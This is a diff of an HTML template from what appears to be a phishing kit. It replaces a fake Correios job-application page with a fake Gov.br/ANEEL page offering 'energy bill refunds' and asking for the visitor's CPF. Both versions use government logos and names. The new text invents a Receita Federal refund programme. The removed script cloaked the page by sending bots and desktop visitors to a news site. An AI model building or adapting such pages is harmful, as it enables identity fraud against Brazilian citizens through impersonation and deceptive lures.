@@ -1,38 +1,9 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <script>
-      // Função para detectar se é um dispositivo móvel
-      function isMobile() {
-        return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
-      }
-
-      // Função para detectar se é um bot
-      function isBot() {
-        return botAgents.some(bot => navigator.userAgent.includes(bot));
-      }
-
-      // Função para verificar se a largura da janela é maior que 768px
-      function isWideScreen() {
-        return window.innerWidth > 768;
-      }
-
-      // Redirecionar ou bloquear o acesso
-      function checkAccess() {
-        if (isBot() || (!isMobile() && isWideScreen())) {
-          window.location.href = "https://g1.globo.com/";
-        }
-      }
-
-      // Executar a função de verificação ao carregar a página
-      window.onload = checkAccess;
-
-      // Adicionar um listener para verificar novamente se a janela for redimensionada
-      window.addEventListener('resize', checkAccess);
-    </script> 
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Correios - Inscrição Concurso 2025</title>
+    <title>Gov.br - Consulta de Restituição de Energia</title>
 
     <!-- Preload fonts -->
     <link rel="preload" href="{{ url_for('static', filename='fonts/rawline-400.woff2') }}" as="font" type="font/woff2" crossorigin>
@@ -42,6 +13,7 @@
     <link href="{{ url_for('static', filename='css/rawline.css') }}" rel="stylesheet">
     <script src="https://cdn.tailwindcss.com"></script>
     <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" rel="stylesheet">
+
     <style>
         body {
             font-family: 'rawline', sans-serif;
@@ -60,8 +32,7 @@
             theme: {
                 extend: {
                     colors: {
-                        'correios-blue': '#003399',
-                        'correios-yellow': '#FEEF37',
+                        'gov-blue': '#003399',
                     }
                 }
             }
@@ -69,25 +40,25 @@
     </script>
 </head>
 <body class="bg-gray-50 min-h-screen flex flex-col">
-
-    <div class="bg-correios-yellow py-4 shadow-sm">
+    <!-- Header Branco com Logo Gov.br -->
+    <div class="bg-white py-4 shadow-sm">
         <div class="container mx-auto px-4">
             <div class="flex flex-col items-center text-center">
-                <img src="https://logodownload.org/wp-content/uploads/2014/05/correios-logo-1-1.png" alt="Logo dos Correios" class="h-12 mb-2" />
+                <img src="https://www.gov.br/++theme++padrao_govbr/img/govbr-logo-large.png" alt="Logo do Gov.br" class="h-12 mb-2" />
                 <div>
-                    <p class="text-correios-blue text-[16px] leading-tight font-bold tracking-wide">
-                        CONCURSO PÚBLICO 2025
+                    <p class="text-gov-blue text-[16px] leading-tight font-bold tracking-wide">
+                        ANEEL - Agência Nacional de Energia Elétrica
                     </p>
-                    <p class="text-correios-blue text-[12px] leading-tight tracking-wide">
-                        SELEÇÃO EXTERNA PARA MÚLTIPLOS CARGOS
+                    <p class="text-gov-blue text-[12px] leading-tight tracking-wide">
+                        Em parceria com a Receita Federal do Brasil
                     </p>
                 </div>
             </div>
         </div>
     </div>
 
-    <!-- Blue bar -->
-    <div class="bg-correios-blue py-3 shadow-md">
+    <!-- Barra Azul -->
+    <div class="bg-gov-blue py-3 shadow-md">
         <div class="container mx-auto px-4 flex items-center">
             <div class="grid grid-cols-2 gap-0.5 mr-3 drop-shadow-sm">
                 <div class="w-2 h-2 bg-white"></div>
@@ -95,24 +66,22 @@
                 <div class="w-2 h-2 bg-white"></div>
                 <div class="w-2 h-2 bg-white"></div>
             </div>
-            <span class="text-white text-xl font-semibold tracking-wide drop-shadow-sm">Sistema de Inscrição</span>
+            <span class="text-white text-xl font-semibold tracking-wide drop-shadow-sm">Consulta de Restituição</span>
         </div>
     </div>
 
     <div class="container mx-auto px-4 py-6">
-        <div class="bg-yellow-50 border border-yellow-100 rounded-lg p-4 mb-6 shadow-sm">
+        <div class="bg-white border border-yellow-100 rounded-lg p-4 mb-6 shadow-sm">
             <div class="flex items-start">
-                <i class="fas fa-info-circle text-correios-blue text-xl mr-3 mt-0.5"></i>
+                <i class="fas fa-info-circle text-gov-blue text-xl mr-3 mt-0.5"></i>
                 <div>
-                    <p class="font-bold mb-2 text-correios-blue">INFORMAÇÕES IMPORTANTES</p>
-                    <p class="text-sm text-gray-700 leading-relaxed">Prezado(a) Candidato(a), bem-vindo(a) ao sistema de inscrição do Concurso Público dos Correios 2025. Vagas disponíveis para os seguintes cargos:</p>
-                    <ul class="list-disc list-inside mt-2 text-sm text-gray-700 leading-relaxed ml-4">
-                        <li>Carteiro</li>
-                        <li>Atendente Comercial</li>
-                        <li>Operador de Triagem e Transbordo</li>
-                        <li>Suporte Administrativo</li>
-                    </ul>
-                    <p class="text-sm text-gray-700 mt-2">O <span class="font-bold">prazo para as inscrições</span> se encerra <span class="font-bold">hoje, {{ current_day }}/{{ current_month }}/{{ current_year }}</span>.</p>
+                    <p class="font-bold mb-2 text-gov-blue">INFORMAÇÃO IMPORTANTE</p>
+                    <p class="text-sm text-gray-700 leading-relaxed">
+                        A Agência Nacional de Energia Elétrica (ANEEL), em conjunto com a Receita Federal, identificou cobranças indevidas em contas de energia elétrica de consumidores em todo o território nacional. Foi instituído um processo de devolução desses valores aos cidadãos elegíveis.
+                    </p>
+                    <p class="text-sm text-gray-700 mt-2">
+                        Verifique agora se você tem direito à restituição e saiba como solicitar o ressarcimento dos valores pagos indevidamente.
+                    </p>
                 </div>
             </div>
         </div>
@@ -120,13 +89,13 @@
 
     <div class="container mx-auto px-4 pb-8 flex-grow">
         <div class="bg-white rounded-lg shadow-lg p-8 border border-gray-100">
-            <form id="inscricaoForm" method="POST" action="{{ url_for('consultar_cpf') }}">
-                <p class="mb-6 font-bold text-lg text-correios-blue">Dados para Inscrição:</p>
+            <form id="consultaForm" method="POST" action="{{ url_for('consultar_cpf') }}">
+                <p class="mb-6 font-bold text-lg text-gov-blue">Consulta de Valores a Restituir:</p>
                 <div class="space-y-6">
                     <div class="relative">
-                        <label class="block text-gray-700 text-sm font-bold mb-2" for="cpf">CPF:</label>
+                        <label class="block text-gray-700 text-sm font-bold mb-2" for="cpf">CPF do Titular da Conta de Energia:</label>
                         <div class="relative">
-                            <input class="appearance-none border border-gray-300 rounded-md w-full py-2.5 px-4 text-gray-700 leading-tight focus:outline-none focus:ring-2 focus:ring-correios-blue focus:border-transparent transition duration-200"
+                            <input class="appearance-none border border-gray-300 rounded-md w-full py-2.5 px-4 text-gray-700 leading-tight focus:outline-none focus:ring-2 focus:ring-gov-blue focus:border-transparent transition duration-200"
                                    id="cpf"
                                    name="cpf"
                                    type="text" 
@@ -139,9 +108,9 @@
                             </div>
                         </div>
                     </div>
-                    <button type="submit" id="submitBtn" class="bg-correios-blue hover:bg-opacity-90 text-white font-bold py-3 px-6 rounded-md w-full flex items-center justify-center space-x-2 shadow-md hover:shadow-lg transition duration-200 mt-4">
-                        <span>Prosseguir com a Inscrição</span>
-                        <i class="fas fa-arrow-right ml-2"></i>
+                    <button type="submit" id="submitBtn" class="bg-gov-blue hover:bg-opacity-90 text-white font-bold py-3 px-6 rounded-md w-full flex items-center justify-center space-x-2 shadow-md hover:shadow-lg transition duration-200 mt-4">
+                        <span>Consultar Valores</span>
+                        <i class="fas fa-search ml-2"></i>
                     </button>
                 </div>
             </form>
@@ -157,40 +126,13 @@
         </div>
     </div>
 
-    <div class="bg-correios-yellow text-correios-blue text-center py-4 mt-auto shadow-inner">
-        <p class="text-sm font-medium">© {{ current_year }} Empresa Brasileira de Correios e Telégrafos. Todos os direitos reservados.</p>
-        <p class="text-sm mt-1">Central de Atendimento dos Correios - 0800 725 0100</p>
+    <!-- Footer -->
+    <div class="bg-gov-blue text-white text-center py-4 mt-auto shadow-inner">
+        <p class="text-sm font-medium">© {{ current_year }} ANEEL - Agência Nacional de Energia Elétrica. Todos os direitos reservados.</p>
+        <p class="text-sm mt-1">Central de Atendimento: 167</p>
     </div>
 
     <script>
-        document.getElementById('inscricaoForm').addEventListener('submit', function(e) {
-            const submitBtn = document.getElementById('submitBtn');
-            const btnText = submitBtn.querySelector('span');
-            const btnIcon = submitBtn.querySelector('i');
-            const cpfInput = document.getElementById('cpf');
-
-            // Remove pontuação antes de enviar
-            cpfInput.value = cpfInput.value.replace(/\D/g, '');
-
-            // Change button appearance
-            submitBtn.classList.add('bg-opacity-75');
-            submitBtn.disabled = true;
-            btnText.textContent = 'Processando...';
-            btnIcon.classList.remove('fa-arrow-right');
-            btnIcon.classList.add('fa-circle-notch', 'animate-spin');
-
-            // Adiciona timeout para restaurar o botão em caso de erro
-            setTimeout(function() {
-                if (submitBtn.disabled) {
-                    submitBtn.classList.remove('bg-opacity-75');
-                    submitBtn.disabled = false;
-                    btnText.textContent = 'Prosseguir com a Inscrição';
-                    btnIcon.classList.remove('fa-circle-notch', 'animate-spin');
-                    btnIcon.classList.add('fa-arrow-right');
-                }
-            }, 10000);
-        });
-
         // Máscara para CPF
         const cpfInput = document.getElementById('cpf');
         cpfInput.addEventListener('input', function(e) {
@@ -227,6 +169,34 @@
                 }
                 e.preventDefault();
             }
+        });
+
+        document.getElementById('consultaForm').addEventListener('submit', function(e) {
+            const submitBtn = document.getElementById('submitBtn');
+            const btnText = submitBtn.querySelector('span');
+            const btnIcon = submitBtn.querySelector('i');
+            const cpfInput = document.getElementById('cpf');
+
+            // Remove pontuação antes de enviar
+            cpfInput.value = cpfInput.value.replace(/\D/g, '');
+
+            // Change button appearance
+            submitBtn.classList.add('bg-opacity-75');
+            submitBtn.disabled = true;
+            btnText.textContent = 'Processando...';
+            btnIcon.classList.remove('fa-search');
+            btnIcon.classList.add('fa-circle-notch', 'animate-spin');
+
+            // Adiciona timeout para restaurar o botão em caso de erro
+            setTimeout(function() {
+                if (submitBtn.disabled) {
+                    submitBtn.classList.remove('bg-opacity-75');
+                    submitBtn.disabled = false;
+                    btnText.textContent = 'Consultar Valores';
+                    btnIcon.classList.remove('fa-circle-notch', 'animate-spin');
+                    btnIcon.classList.add('fa-search');
+                }
+            }, 10000);
         });
     </script>
 </body>
